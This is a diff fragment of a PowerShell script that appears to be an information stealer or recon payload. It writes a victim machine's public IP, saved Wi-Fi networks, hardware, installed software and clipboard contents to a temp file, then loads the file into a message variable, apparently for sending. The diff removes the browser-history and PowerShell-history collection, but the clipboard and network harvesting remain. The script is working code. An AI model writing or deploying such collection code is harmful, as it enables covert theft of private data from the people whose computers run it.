@@ -68,8 +68,6 @@ $outpath = "$env:temp\systeminfo.txt"
 "NETWORK INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Public IP          : $computerPubIP" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Saved Networks     : `n$outssid" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Local IP           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($computerIP| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Adapters           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
 ($network| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 "`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
@@ -86,8 +84,6 @@ $outpath = "$env:temp\systeminfo.txt"
 ($videocard| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 "HDD Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
 ($Hdds| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"USB Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($COMDevices| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 "`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "SOFTWARE INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Installed Software `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
@@ -101,13 +97,6 @@ $outpath = "$env:temp\systeminfo.txt"
 "HISTORY INFO `n ====================================================================== `n" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Clipboard          `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
 (Get-Clipboard | Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Browser History    `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($Value| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-($Value2| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Powershell History `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($pshistory| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
-
 
 $Pathsys = "$env:temp\systeminfo.txt"
 $msgsys = Get-Content -Path $Pathsys -Raw 
